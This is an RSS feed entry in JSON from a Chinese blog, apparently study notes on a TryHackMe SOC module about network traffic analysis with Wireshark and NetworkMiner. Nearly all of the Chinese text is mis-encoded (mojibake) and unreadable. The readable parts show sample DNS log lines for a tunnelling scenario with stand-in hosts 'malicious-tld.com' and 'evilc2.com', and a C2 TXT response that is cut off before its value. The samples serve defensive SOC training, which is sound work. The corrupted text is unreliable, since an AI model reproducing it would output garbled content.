{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "TryHackMe-SOC-Section 6：网络流量分析",
      "link": "https://www.cnblogs.com/dhan/p/19429465",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/dhan/p/19429465\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäºŽ 2026-01-01 08:06\">\n    <span>TryHackMe-SOC-Section 6ï¼šç½‘ç»œæµé‡åˆ†æž</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        å­¦ä¹ ç½‘ç»œæµé‡åˆ†æžçš„åŸºç¡€çŸ¥è¯†ï¼Œå¹¶äº²èº«ä½¿ç”¨ Wireshark æ£€æµ‹å„ç§ç±»åž‹çš„æ”»å‡»ã€‚\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#section-6ç½‘ç»œæµé‡åˆ†æž\" rel=\"noopener nofollow\">Section 6ï¼šç½‘ç»œæµé‡åˆ†æž</a><ul><li><a href=\"#ç½‘ç»œæµé‡åŸºç¡€çŸ¥è¯†\" rel=\"noopener nofollow\">ç½‘ç»œæµé‡åŸºç¡€çŸ¥è¯†</a><ul><li><a href=\"#ä»‹ç»\" rel=\"noopener nofollow\">ä»‹ç»</a></li><li><a href=\"#ç½‘ç»œæµé‡åˆ†æžçš„ç›®çš„æ˜¯ä»€ä¹ˆ\" rel=\"noopener nofollow\">ç½‘ç»œæµé‡åˆ†æžçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</a><ul><li><a href=\"#æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åˆ†æžç½‘ç»œæµé‡\" rel=\"noopener nofollow\">æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åˆ†æžç½‘ç»œæµé‡ï¼Ÿ</a></li></ul></li><li><a href=\"#æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å“ªäº›ç½‘ç»œæµé‡\" rel=\"noopener nofollow\">æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å“ªäº›ç½‘ç»œæµé‡ï¼Ÿ</a></li><li><a href=\"#ç½‘ç»œæµé‡æ¥æºå’Œæµå‘\" rel=\"noopener nofollow\">ç½‘ç»œæµé‡æ¥æºå’Œæµå‘</a><ul><li><a href=\"#æ¥æº\" rel=\"noopener nofollow\">æ¥æº</a></li><li><a href=\"#æµé‡\" rel=\"noopener nofollow\">æµé‡</a></li><li><a href=\"#æµç¨‹ç¤ºä¾‹\" rel=\"noopener nofollow\">æµç¨‹ç¤ºä¾‹</a></li></ul></li><li><a href=\"#æˆ‘ä»¬å¦‚ä½•è§‚å¯Ÿç½‘ç»œæµé‡\" rel=\"noopener nofollow\">æˆ‘ä»¬å¦‚ä½•è§‚å¯Ÿç½‘ç»œæµé‡?</a><ul><li><a href=\"#æ—¥å¿—\" rel=\"noopener nofollow\">æ—¥å¿—</a></li><li><a href=\"#å®Œæ•´æ•°æ®åŒ…æ•èŽ·\" rel=\"noopener nofollow\">å®Œæ•´æ•°æ®åŒ…æ•èŽ·</a></li><li><a href=\"#ç½‘ç»œç»Ÿè®¡\" rel=\"noopener nofollow\">ç½‘ç»œç»Ÿè®¡</a></li></ul></li></ul></li><li><a href=\"#wiresharkåŸºç¡€çŸ¥è¯†\" rel=\"noopener nofollow\">Wiresharkï¼šåŸºç¡€çŸ¥è¯†</a><ul><li><a href=\"#ä»‹ç»-1\" rel=\"noopener nofollow\">ä»‹ç»</a><ul><li><a href=\"#å­¦ä¹ ç›®æ ‡\" rel=\"noopener nofollow\">å­¦ä¹ ç›®æ ‡</a></li></ul></li><li><a href=\"#å·¥å…·æè¿°\" rel=\"noopener nofollow\">å·¥å…·æè¿°</a><ul><li><a href=\"#ç”¨ä¾‹\" rel=\"noopener nofollow\">ç”¨ä¾‹</a></li><li><a href=\"#å›¾å½¢ç”¨æˆ·ç•Œé¢å’Œæ•°æ®\" rel=\"noopener nofollow\">å›¾å½¢ç”¨æˆ·ç•Œé¢å’Œæ•°æ®</a></li><li><a href=\"#åŠ è½½pcapæ–‡ä»¶\" rel=\"noopener nofollow\">åŠ è½½PCAPæ–‡ä»¶</a></li><li><a href=\"#æ¶‚è‰²åŒ\" rel=\"noopener nofollow\">æ¶‚è‰²åŒ…</a></li><li><a href=\"#äº¤é€šå—…æŽ¢\" rel=\"noopener nofollow\">äº¤é€šå—…æŽ¢</a></li><li><a href=\"#åˆå¹¶pcapæ–‡ä»¶\" rel=\"noopener nofollow\">åˆå¹¶PCAPæ–‡ä»¶</a></li><li><a href=\"#æŸ¥çœ‹æ–‡ä»¶è¯¦æƒ\" rel=\"noopener nofollow\">æŸ¥çœ‹æ–‡ä»¶è¯¦æƒ…</a></li></ul></li><li><a href=\"#åŒ…è§£å‰–\" rel=\"noopener nofollow\">åŒ…è§£å‰–</a><ul><li><a href=\"#åŒ…è§£å‰–-1\" rel=\"noopener nofollow\">åŒ…è§£å‰–</a></li><li><a href=\"#æ•°æ®åŒ…è¯¦æƒ\" rel=\"noopener nofollow\">æ•°æ®åŒ…è¯¦æƒ…</a></li></ul></li><li><a href=\"#æ•°æ®åŒ…å¯¼èˆª\" rel=\"noopener nofollow\">æ•°æ®åŒ…å¯¼èˆª</a><ul><li><a href=\"#æ•°æ®åŒ…ç¼–å·\" rel=\"noopener nofollow\">æ•°æ®åŒ…ç¼–å·</a></li><li><a href=\"#å‰å¾€æ•°æ®åŒ\" rel=\"noopener nofollow\">å‰å¾€æ•°æ®åŒ…</a></li><li><a href=\"#æŸ¥æ‰¾æ•°æ®åŒ\" rel=\"noopener nofollow\">æŸ¥æ‰¾æ•°æ®åŒ…</a></li><li><a href=\"#æ ‡è®°åŒ\" rel=\"noopener nofollow\">æ ‡è®°åŒ…</a></li><li><a href=\"#æ•°æ®åŒ…æ³¨é‡Š\" rel=\"noopener nofollow\">æ•°æ®åŒ…æ³¨é‡Š</a></li><li><a href=\"#å¯¼å‡ºæ•°æ®åŒ\" rel=\"noopener nofollow\">å¯¼å‡ºæ•°æ®åŒ…</a></li><li><a href=\"#å¯¼å‡ºå¯¹è±¡æ–‡ä»¶\" rel=\"noopener nofollow\">å¯¼å‡ºå¯¹è±¡ï¼ˆæ–‡ä»¶ï¼‰</a></li><li><a href=\"#æ—¶é—´æ˜¾ç¤ºæ ¼å¼\" rel=\"noopener nofollow\">æ—¶é—´æ˜¾ç¤ºæ ¼å¼</a></li><li><a href=\"#ä¸“å®¶ä¿¡æ¯\" rel=\"noopener nofollow\">ä¸“å®¶ä¿¡æ¯</a></li></ul></li><li><a href=\"#æ•°æ®åŒ…è¿‡æ»¤\" rel=\"noopener nofollow\">æ•°æ®åŒ…è¿‡æ»¤</a><ul><li><a href=\"#æ•°æ®åŒ…è¿‡æ»¤-1\" rel=\"noopener nofollow\">æ•°æ®åŒ…è¿‡æ»¤</a></li><li><a href=\"#åº”ç”¨ä¸ºç­›é€‰å™¨\" rel=\"noopener nofollow\">åº”ç”¨ä¸ºç­›é€‰å™¨</a></li><li><a href=\"#å¯¹è¯è¿‡æ»¤å™¨\" rel=\"noopener nofollow\">å¯¹è¯è¿‡æ»¤å™¨</a></li><li><a href=\"#ä¸ºå¯¹è¯ç€è‰²\" rel=\"noopener nofollow\">ä¸ºå¯¹è¯ç€è‰²</a></li><li><a href=\"#å‡†å¤‡ä½œä¸ºè¿‡æ»¤å™¨\" rel=\"noopener nofollow\">å‡†å¤‡ä½œä¸ºè¿‡æ»¤å™¨</a></li><li><a href=\"#ä½œä¸ºåˆ—åº”ç”¨\" rel=\"noopener nofollow\">ä½œä¸ºåˆ—åº”ç”¨</a></li><li><a href=\"#è·Ÿè¸ªæµ\" rel=\"noopener nofollow\">è·Ÿè¸ªæµ</a></li></ul></li></ul></li><li><a href=\"#wiresharkæ•°æ®åŒ…æ“ä½œ\" rel=\"noopener nofollow\">Wiresharkï¼šæ•°æ®åŒ…æ“ä½œ</a><ul><li><a href=\"#ä»‹ç»-2\" rel=\"noopener nofollow\">ä»‹ç»</a></li><li><a href=\"#ç»Ÿè®¡æ•°æ®--æ‘˜è¦\" rel=\"noopener nofollow\">ç»Ÿè®¡æ•°æ® | æ‘˜è¦</a><ul><li><a href=\"#ç»Ÿè®¡æ•°æ®\" rel=\"noopener nofollow\">ç»Ÿè®¡æ•°æ®</a></li><li><a href=\"#å·²è§£æžåœ°å€\" rel=\"noopener nofollow\">å·²è§£æžåœ°å€</a></li><li><a href=\"#åè®®å±‚æ¬¡ç»“æž„\" rel=\"noopener nofollow\">åè®®å±‚æ¬¡ç»“æž„</a></li><li><a href=\"#ä¼šè¯\" rel=\"noopener nofollow\">ä¼šè¯</a></li><li><a href=\"#ç»ˆç‚¹\" rel=\"noopener nofollow\">ç»ˆç‚¹</a></li></ul></li><li><a href=\"#ç»Ÿè®¡æ•°æ®--åè®®è¯¦æƒ\" rel=\"noopener nofollow\">ç»Ÿè®¡æ•°æ® | åè®®è¯¦æƒ…</a><ul><li><a href=\"#ipv4-å’Œ-ipv6\" rel=\"noopener nofollow\">IPv4 å’Œ IPv6</a></li><li><a href=\"#dns\" rel=\"noopener nofollow\">DNS</a></li><li><a href=\"#http\" rel=\"noopener nofollow\">HTTP</a></li></ul></li><li><a href=\"#æ•°æ®åŒ…è¿‡æ»¤--åŽŸç†\" rel=\"noopener nofollow\">æ•°æ®åŒ…è¿‡æ»¤ | åŽŸç†</a><ul><li><a href=\"#æ•èŽ·è¿‡æ»¤å™¨è¯­æ³•\" rel=\"noopener nofollow\">æ•èŽ·è¿‡æ»¤å™¨è¯­æ³•</a></li><li><a href=\"#æ˜¾ç¤ºç­›é€‰è¯­æ³•\" rel=\"noopener nofollow\">æ˜¾ç¤ºç­›é€‰è¯­æ³•</a></li><li><a href=\"#æ¯”è¾ƒè¿ç®—ç¬¦\" rel=\"noopener nofollow\">æ¯”è¾ƒè¿ç®—ç¬¦</a></li><li><a href=\"#é€»è¾‘è¡¨è¾¾å¼\" rel=\"noopener nofollow\">é€»è¾‘è¡¨è¾¾å¼</a></li><li><a href=\"#æ•°æ®åŒ…è¿‡æ»¤å·¥å…·æ \" rel=\"noopener nofollow\">æ•°æ®åŒ…è¿‡æ»¤å·¥å…·æ </a></li></ul></li><li><a href=\"#æ•°æ®åŒ…è¿‡æ»¤--åè®®è¿‡æ»¤å™¨\" rel=\"noopener nofollow\">æ•°æ®åŒ…è¿‡æ»¤ | åè®®è¿‡æ»¤å™¨</a><ul><li><a href=\"#ipè¿‡æ»¤å™¨\" rel=\"noopener nofollow\">IPè¿‡æ»¤å™¨</a></li><li><a href=\"#tcp-å’Œ-udp-è¿‡æ»¤å™¨\" rel=\"noopener nofollow\">TCP å’Œ UDP è¿‡æ»¤å™¨</a></li><li><a href=\"#åº”ç”¨å±‚åè®®è¿‡æ»¤å™¨--http-å’Œ-dns\" rel=\"noopener nofollow\">åº”ç”¨å±‚åè®®è¿‡æ»¤å™¨ | HTTP å’Œ DNS</a></li><li><a href=\"#æ˜¾ç¤ºç­›é€‰è¡¨è¾¾å¼\" rel=\"noopener nofollow\">æ˜¾ç¤ºç­›é€‰è¡¨è¾¾å¼</a></li></ul></li><li><a href=\"#é«˜çº§ç­›é€‰\" rel=\"noopener nofollow\">é«˜çº§ç­›é€‰</a><ul><li><a href=\"#ç­›é€‰æ¡ä»¶åŒ…å«\" rel=\"noopener nofollow\">ç­›é€‰æ¡ä»¶ï¼šâ€œåŒ…å«â€</a></li><li><a href=\"#ç­›é€‰æ¡ä»¶åŒ¹é…\" rel=\"noopener nofollow\">ç­›é€‰æ¡ä»¶ï¼šâ€œåŒ¹é…â€</a></li><li><a href=\"#ç­›é€‰æ¡ä»¶in\" rel=\"noopener nofollow\">ç­›é€‰æ¡ä»¶ï¼šâ€œinâ€</a></li><li><a href=\"#ç­›é€‰æ¡ä»¶å¤§å†™\" rel=\"noopener nofollow\">ç­›é€‰æ¡ä»¶ï¼šâ€œå¤§å†™â€</a></li></ul></li><li><a href=\"#ç­›é€‰æ¡ä»¶å°å†™\" rel=\"noopener nofollow\">ç­›é€‰æ¡ä»¶ï¼šâ€œå°å†™â€</a><ul><li><a href=\"#ç­›é€‰æ¡ä»¶è½¬å­—ç¬¦ä¸²åŒ¹é…\" rel=\"noopener nofollow\">ç­›é€‰æ¡ä»¶ï¼šâ€œè½¬å­—ç¬¦ä¸²åŒ¹é…â€</a></li><li><a href=\"#ä¹¦ç­¾å’Œç­›é€‰æŒ‰é’®\" rel=\"noopener nofollow\">ä¹¦ç­¾å’Œç­›é€‰æŒ‰é’®</a></li><li><a href=\"#ç®€ä»‹\" rel=\"noopener nofollow\">ç®€ä»‹</a></li></ul></li></ul></li><li><a href=\"#wiresharkæµé‡åˆ†æž\" rel=\"noopener nofollow\">Wiresharkï¼šæµé‡åˆ†æž</a><ul><li><a href=\"#nmapæ‰«æ\" rel=\"noopener nofollow\">Nmapæ‰«æ</a><ul><li><a href=\"#tcpè¿žæŽ¥æ‰«æ\" rel=\"noopener nofollow\">TCPè¿žæŽ¥æ‰«æ</a></li><li><a href=\"#åŒæ­¥æ‰«æ\" rel=\"noopener nofollow\">åŒæ­¥æ‰«æ</a></li><li><a href=\"#udpæ‰«æ\" rel=\"noopener nofollow\">UDPæ‰«æ</a></li></ul></li><li><a href=\"#arpæŠ•æ¯’æ”»å‡»å’Œä¸­é—´äººæ”»å‡»\" rel=\"noopener nofollow\">ARPæŠ•æ¯’æ”»å‡»å’Œä¸­é—´äººæ”»å‡»ï¼</a><ul><li><a href=\"#arpæ¬ºéª—ä¸­å’Œæ”»å‡»åˆç§°ä¸­é—´äººæ”»å‡»\" rel=\"noopener nofollow\">ARPæ¬ºéª—/ä¸­å’Œæ”»å‡»ï¼ˆåˆç§°ä¸­é—´äººæ”»å‡»ï¼‰</a></li></ul></li><li><a href=\"#ä¸»æœºè¯†åˆ«dhcpnetbios-å’Œ-kerberos\" rel=\"noopener nofollow\">ä¸»æœºè¯†åˆ«ï¼šDHCPã€NetBIOS å’Œ Kerberos</a><ul><li><a href=\"#è¯†åˆ«å®¿ä¸»\" rel=\"noopener nofollow\">è¯†åˆ«å®¿ä¸»</a></li><li><a href=\"#dhcpåˆ†æž\" rel=\"noopener nofollow\">DHCPåˆ†æž</a></li><li><a href=\"#netbios-nbns-åˆ†æž\" rel=\"noopener nofollow\">NetBIOS (NBNS) åˆ†æž</a></li><li><a href=\"#kerberos-åˆ†æž\" rel=\"noopener nofollow\">Kerberos åˆ†æž</a></li></ul></li><li><a href=\"#éš§é“æµé‡dns-å’Œ-icmp\" rel=\"noopener nofollow\">éš§é“æµé‡ï¼šDNS å’Œ ICMP</a><ul><li><a href=\"#icmpåˆ†æž\" rel=\"noopener nofollow\">ICMPåˆ†æž</a></li><li><a href=\"#dns-åˆ†æž\" rel=\"noopener nofollow\">DNS åˆ†æž</a></li></ul></li><li><a href=\"#æ˜Žæ–‡åè®®åˆ†æžftp\" rel=\"noopener nofollow\">æ˜Žæ–‡åè®®åˆ†æžï¼šFTP</a><ul><li><a href=\"#ftpåˆ†æž\" rel=\"noopener nofollow\">FTPåˆ†æž</a></li></ul></li><li><a href=\"#æ˜Žæ–‡åè®®åˆ†æžhttp\" rel=\"noopener nofollow\">æ˜Žæ–‡åè®®åˆ†æžï¼šHTTP</a><ul><li><a href=\"#ç”¨æˆ·ä»£ç†åˆ†æž\" rel=\"noopener nofollow\">ç”¨æˆ·ä»£ç†åˆ†æž</a></li><li><a href=\"#log4j-åˆ†æž\" rel=\"noopener nofollow\">Log4j åˆ†æž</a></li></ul></li><li><a href=\"#åŠ å¯†åè®®åˆ†æžè§£å¯†-https\" rel=\"noopener nofollow\">åŠ å¯†åè®®åˆ†æžï¼šè§£å¯† HTTPS</a></li><li><a href=\"#å¥–åŠ±å¯»æ‰¾æ˜Žæ–‡å‡­è¯\" rel=\"noopener nofollow\">å¥–åŠ±ï¼šå¯»æ‰¾æ˜Žæ–‡å‡­è¯ï¼</a></li><li><a href=\"#é¢å¤–ç¦åˆ©å¯æ‰§è¡Œçš„ç»“æžœ\" rel=\"noopener nofollow\">é¢å¤–ç¦åˆ©ï¼šå¯æ‰§è¡Œçš„ç»“æžœï¼</a></li><li><a href=\"#ç»“è®º\" rel=\"noopener nofollow\">ç»“è®º</a></li></ul></li><li><a href=\"#ç½‘ç»œçŸ¿å·¥\" rel=\"noopener nofollow\">ç½‘ç»œçŸ¿å·¥</a><ul><li><a href=\"#ä»‹ç»-3\" rel=\"noopener nofollow\">ä»‹ç»</a></li><li><a href=\"#networkminer-åœ¨å–è¯ä¸­çš„åº”ç”¨\" rel=\"noopener nofollow\">NetworkMiner åœ¨å–è¯ä¸­çš„åº”ç”¨</a><ul><li><a href=\"#ç½‘ç»œæŒ–æŽ˜åœ¨å–è¯ä¸­çš„åº”ç”¨\" rel=\"noopener nofollow\">ç½‘ç»œæŒ–æŽ˜åœ¨å–è¯ä¸­çš„åº”ç”¨</a></li><li><a href=\"#æ”¯æŒçš„æ•°æ®ç±»åž‹\" rel=\"noopener nofollow\">æ”¯æŒçš„æ•°æ®ç±»åž‹</a></li></ul></li><li><a href=\"#networkmineræ˜¯ä»€ä¹ˆ\" rel=\"noopener nofollow\">NetworkMineræ˜¯ä»€ä¹ˆï¼Ÿ</a><ul><li><a href=\"#networkminer-ç®€ä»‹\" rel=\"noopener nofollow\">NetworkMiner ç®€ä»‹</a></li><li><a href=\"#æ“ä½œæ¨¡å¼\" rel=\"noopener nofollow\">æ“ä½œæ¨¡å¼</a></li><li><a href=\"#ä¼˜ç‚¹å’Œç¼ºç‚¹\" rel=\"noopener nofollow\">ä¼˜ç‚¹å’Œç¼ºç‚¹</a></li><li><a href=\"#wireshark-å’Œ-networkminer-çš„åŒºåˆ«\" rel=\"noopener nofollow\">Wireshark å’Œ NetworkMiner çš„åŒºåˆ«</a></li></ul></li><li><a href=\"#å·¥å…·æ¦‚è¿°-1\" rel=\"noopener nofollow\">å·¥å…·æ¦‚è¿° 1</a><ul><li><a href=\"#é¦–é¡µ\" rel=\"noopener nofollow\">é¦–é¡µ</a></li><li><a href=\"#æ–‡ä»¶èœå•\" rel=\"noopener nofollow\">æ–‡ä»¶èœå•</a></li><li><a href=\"#å·¥å…·èœå•\" rel=\"noopener nofollow\">å·¥å…·èœå•</a></li><li><a href=\"#å¸®åŠ©èœå•\" rel=\"noopener nofollow\">å¸®åŠ©èœå•</a></li><li><a href=\"#æœºç®±é¢æ¿\" rel=\"noopener nofollow\">æœºç®±é¢æ¿</a></li><li><a href=\"#ä¸»æœº\" rel=\"noopener nofollow\">ä¸»æœº</a></li><li><a href=\"#ä¼šè¯-1\" rel=\"noopener nofollow\">ä¼šè¯</a></li><li><a href=\"#dns-1\" rel=\"noopener nofollow\">DNS</a></li><li><a href=\"#è¯ä¹¦\" rel=\"noopener nofollow\">è¯ä¹¦</a></li></ul></li><li><a href=\"#å·¥å…·æ¦‚è¿°-2\" rel=\"noopener nofollow\">å·¥å…·æ¦‚è¿° 2</a><ul><li><a href=\"#æ–‡ä»¶\" rel=\"noopener nofollow\">æ–‡ä»¶</a></li><li><a href=\"#å›¾ç‰‡\" rel=\"noopener nofollow\">å›¾ç‰‡</a></li><li><a href=\"#å‚æ•°\" rel=\"noopener nofollow\">å‚æ•°</a></li><li><a href=\"#å…³é”®è¯keyword\" rel=\"noopener nofollow\">å…³é”®è¯(keyword)</a></li><li><a href=\"#æ¶ˆæ¯\" rel=\"noopener nofollow\">æ¶ˆæ¯</a></li><li><a href=\"#å¼‚å¸¸\" rel=\"noopener nofollow\">å¼‚å¸¸</a></li></ul></li><li><a href=\"#ç‰ˆæœ¬å·®å¼‚\" rel=\"noopener nofollow\">ç‰ˆæœ¬å·®å¼‚</a><ul><li><a href=\"#macåœ°å€å¤„ç†\" rel=\"noopener nofollow\">MACåœ°å€å¤„ç†</a></li><li><a href=\"#å¸§å¤„ç†\" rel=\"noopener nofollow\">å¸§å¤„ç†</a></li><li><a href=\"#å‚æ•°å¤„ç†\" rel=\"noopener nofollow\">å‚æ•°å¤„ç†</a></li></ul></li><li><a href=\"#ç»ƒä¹\" rel=\"noopener nofollow\">ç»ƒä¹ </a></li></ul></li></ul></li></ul></div><p></p>\n<h2 id=\"section-6ç½‘ç»œæµé‡åˆ†æž\">Section 6ï¼šç½‘ç»œæµé‡åˆ†æž</h2>\n<h3 id=\"ç½‘ç»œæµé‡åŸºç¡€çŸ¥è¯†\">ç½‘ç»œæµé‡åŸºç¡€çŸ¥è¯†</h3>\n<p>äº†è§£ä»€ä¹ˆæ˜¯ç½‘ç»œåˆ†æžã€ä¸ºä»€ä¹ˆå®ƒè‡³å…³é‡è¦ã€å¦‚ä½•æ”¶é›†ç½‘ç»œæµé‡ä»¥åŠæœ‰å“ªäº›å·¥å…·å¯ç”¨ã€‚</p>\n<h4 id=\"ä»‹ç»\">ä»‹ç»</h4>\n<p>ç½‘ç»œæµé‡åˆ†æž ( NTA ) æ˜¯ä¸€ä¸ªæ¶µç›–æ•èŽ·ã€æ£€æŸ¥å’Œåˆ†æžç½‘ç»œä¸­æ•°æ®æµçš„è¿‡ç¨‹ã€‚å…¶ç›®æ ‡æ˜¯å…¨é¢äº†è§£ç½‘ç»œå†…å¤–é€šä¿¡çš„å†…å®¹ã€‚éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼ŒNTAå¹¶éž Wireshark å·¥å…·çš„åŒä¹‰è¯ã€‚å®ƒè¿œä¸æ­¢äºŽæ­¤ï¼šNTA ç»“åˆäº†å¤šç§æ—¥å¿—ã€æ·±åº¦åŒ…æ£€æµ‹å’Œç½‘ç»œæµé‡ç»Ÿè®¡ä¿¡æ¯ï¼Œå¹¶é’ˆå¯¹ç‰¹å®šçš„ç›®æ ‡ï¼ˆæˆ‘ä»¬å°†åœ¨åŽæ–‡è®¨è®ºï¼‰è¿›è¡Œå…³è”åˆ†æžã€‚</p>\n<p>æŽŒæ¡ç½‘ç»œæµé‡åˆ†æžæŠ€èƒ½è‡³å…³é‡è¦ï¼Œè¿™ä¸ä»…å¯¹æœ‰å¿—æˆä¸ºå®‰å…¨è¿è¥ä¸­å¿ƒ (SOC)ä¸€çº§åˆ†æžå¸ˆçš„äººæ¥è¯´å¦‚æ­¤ï¼Œå¯¹è“é˜Ÿå’Œçº¢é˜Ÿä¸­çš„è®¸å¤šå…¶ä»–è§’è‰²ä¹ŸåŒæ ·é‡è¦ã€‚ä½œä¸ºä¸€åä¸€çº§åˆ†æžå¸ˆï¼Œä½ éœ€è¦èƒ½å¤Ÿä»Žæµ·é‡çš„ç½‘ç»œä¿¡æ¯ä¸­ç†æ¸…å¤´ç»ªï¼Œåˆ†è¾¨å“ªäº›æ˜¯æ­£å¸¸æƒ…å†µï¼Œå“ªäº›æ˜¯åç¦»åŸºå‡†çº¿çš„æƒ…å†µã€‚</p>\n<p>åœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘ä»¬å°†é‡ç‚¹è®¨è®ºç½‘ç»œæµé‡åˆ†æžçš„å®šä¹‰ã€ä¸ºä»€ä¹ˆéœ€è¦å®ƒã€å¦‚ä½•è§‚å¯Ÿç½‘ç»œæµé‡ä»¥åŠéœ€è¦æ³¨æ„çš„ä¸€äº›ç½‘ç»œæµé‡æ¥æºå’Œæµå‘ã€‚</p>\n<ul>\n<li>å­¦ä¹ ç›®æ ‡\n<ul>\n<li>äº†è§£ä»€ä¹ˆæ˜¯ç½‘ç»œæµé‡åˆ†æž</li>\n<li>äº†è§£å¯ä»¥è§‚å¯Ÿåˆ°ä»€ä¹ˆ</li>\n<li>äº†è§£å¦‚ä½•ç›‘æŽ§ç½‘ç»œæµé‡</li>\n<li>äº†è§£å…¸åž‹çš„ç½‘ç»œæµé‡æ¥æºå’Œæµ</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"ç½‘ç»œæµé‡åˆ†æžçš„ç›®çš„æ˜¯ä»€ä¹ˆ\">ç½‘ç»œæµé‡åˆ†æžçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</h4>\n<p>æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åˆ†æžç½‘ç»œæµé‡ï¼Ÿåœ¨å›žç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹é¢çš„åœºæ™¯ã€‚</p>\n<p><strong>DNSéš§é“å’Œä¿¡æ ‡</strong><br />\næ‚¨æ˜¯ä¸€åSOCåˆ†æžå¸ˆï¼Œæ”¶åˆ°ä¸€æ¡è­¦æŠ¥ï¼ŒæŒ‡å‡ºæ¥è‡ªåä¸ºWIN-016ã€IPåœ°å€ä¸º192.168.1.16çš„ä¸»æœºçš„DNSæŸ¥è¯¢æ•°é‡å¼‚å¸¸å¢žå¤šã€‚é˜²ç«å¢™ä¸Šçš„DNSæ—¥å¿—æ˜¾ç¤ºï¼Œå¤šä¸ªDNSæŸ¥è¯¢å‘å¾€åŒä¸€ä¸ªé¡¶çº§åŸŸåï¼ˆTLDï¼‰ï¼Œæ¯æ¬¡éƒ½ä½¿ç”¨ä¸åŒçš„å­åŸŸåã€‚</p>\n<pre><code class=\"language-bash\">2025-10-03 09:15:23    SRC=192.168.1.16      QUERY=aj39skdm.malicious-tld.com    QTYPE=A      \n2025-10-03 09:15:31    SRC=192.168.1.16      QUERY=msd91azx.malicious-tld.com    QTYPE=A     \n2025-10-03 09:15:45    SRC=192.168.1.16      QUERY=cmd01.malicious-tld.com       QTYPE=TXT     \n2025-10-03 09:15:45    SRC=192.168.1.16      QUERY=cmd01.malicious-tld.com       QTYPE=TXT     \n</code></pre>\n<p>æ ¹æ® DNS æ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥æ£€ç´¢åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p>\n<ul>\n<li>æŸ¥è¯¢å’ŒæŸ¥è¯¢ç±»åž‹</li>\n<li>å­åŸŸåå’Œé¡¶çº§åŸŸåï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ abuseDB æˆ– VirusTotal ç­‰å·¥å…·æ¥æ£€æŸ¥åŸŸåæ˜¯å¦æ¶æ„ã€‚</li>\n<li>ä¸»æœº IPï¼šæˆ‘ä»¬å¯ä»¥è¯†åˆ«å‘å‡º DNS æŸ¥è¯¢çš„ç³»ç»Ÿã€‚</li>\n<li>ç›®æ ‡ IPï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href=\"https://www.abuseipdb.com/\" rel=\"noopener nofollow\" target=\"_blank\">AbuseIPDB</a>æˆ–<a href=\"https://virustotal.com/\" rel=\"noopener nofollow\" target=\"_blank\">VirusTotal</a>ç­‰å·¥å…·æ¥éªŒè¯è¯¥ IP æ˜¯å¦è¢«æ ‡è®°ä¸ºæ¶æ„ IPã€‚</li>\n<li>æ—¶é—´æˆ³ï¼šæˆ‘ä»¬å¯ä»¥æž„å»ºä¸€ä¸ªæ—¶é—´çº¿ï¼Œè®°å½•ä¸‹ä¸åŒçš„å¯ç–‘æŸ¥è¯¢ã€‚</li>\n</ul>\n<p>DNS æ—¥å¿—åŒ…å«çš„ä¿¡æ¯ä»…é™äºŽæ­¤ï¼Œå› æ­¤ä»…å‡­è¿™äº›ä¿¡æ¯å¾ˆéš¾å¾—å‡ºç»“è®ºã€‚æˆ‘ä»¬éœ€è¦æ›´å½»åº•åœ°æ£€æŸ¥ DNS æµé‡ï¼Œå¹¶æ ¸å¯¹ DNS æŸ¥è¯¢å’Œå“åº”çš„å†…å®¹ã€‚è¿™å°†æœ‰åŠ©äºŽæˆ‘ä»¬ç¡®å®šè¿™äº›æŸ¥è¯¢å’Œå“åº”çš„æ€§è´¨ã€‚</p>\n<p>è¿™ç§æƒ…å†µå……åˆ†è¯´æ˜Žäº†ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ç½‘ç»œæµé‡åˆ†æžã€‚é˜²ç«å¢™å’Œå…¶ä»–è®¾å¤‡ä¼šè®°å½• DNS æŸ¥è¯¢åŠå…¶å“åº”ï¼Œä½†ä¸ä¼šè®°å½•å…¶å†…å®¹ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ TXT è®°å½•å‘å—æ„ŸæŸ“çš„ç³»ç»Ÿå‘é€å‘½ä»¤ä¸ŽæŽ§åˆ¶ (C2) æŒ‡ä»¤ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æŸ¥ DNS æŸ¥è¯¢çš„å†…å®¹æ¥å‘çŽ°è¿™ä¸€ç‚¹ã€‚ä¸‹é¢çš„æ•°æ®åŒ…æ•èŽ·ç‰‡æ®µæ˜¾ç¤ºäº†ä¸€ä¸ªåŒ…å« C2 å‘½ä»¤çš„ DNS å“åº”çš„å†…å®¹ã€‚</p>\n<pre><code class=\"language-json\">Domain Name System (response)\n    Transaction ID: 0x4a2b\n    Flags: 0x8180 Standard query response, No error\n        1... .... .... .... = Response: Message is a response\n        .... .... .... 0000 = RCODE: No error (0)\n    Questions: 1\n    Answer RRs: 1\n    Authority RRs: 0\n    Additional RRs: 0\n    Queries\n        cmd1.evilc2.com: type TXT, class IN\n    Answers\n        cmd1.evilc2.com: type TXT, class IN, TTL 60, TXT length: 20\n            TXT: 